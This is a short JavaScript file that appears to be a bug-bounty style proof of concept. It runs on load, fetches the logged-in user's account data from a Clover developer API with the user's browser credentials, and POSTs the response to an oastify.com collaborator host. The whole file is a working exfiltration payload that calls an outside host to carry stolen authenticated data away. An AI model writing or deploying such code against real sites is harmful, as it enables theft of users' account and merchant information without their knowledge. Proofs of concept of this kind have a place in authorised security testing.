// t.js

function fetchData() {
  const url = 'https://dev1.dev.clover.com/v3/accounts/current?expand=primaryDeveloper%2CprimaryEnterprise%2CprimaryMerchant%2CprimaryMerchant.properties%2CprimaryReseller&_=1706027175630';
  const headers = new Headers({ 'Content-Type': 'application/json' });

  fetch(url, { 
    method: 'GET', 
    headers: headers, 
    credentials: 'include' 
  })
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }
    return response.json();
  })
  .then(data => {
    // Send the data to https://myservetest.com/data= using a POST request
    sendDataToServer(data);
  })
  .catch(error => {
    console.error('Fetch error:', error);
  });
}

function sendDataToServer(data) {
  const serverUrl = 'icywhtb2dua9y8ur1m5s4zfiv910psdh.oastify.com/data=';
  const headers = new Headers({
    'Content-Type': 'application/json',
  });

  fetch(serverUrl, {
    method: 'POST',
    headers: headers,
    body: JSON.stringify(data),
  })
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }
    console.log('Data successfully sent to the server.');
  })
  .catch(error => {
    console.error('Error sending data to the server:', error);
  });
}

// Call the fetchData function when the script is loaded
fetchData();
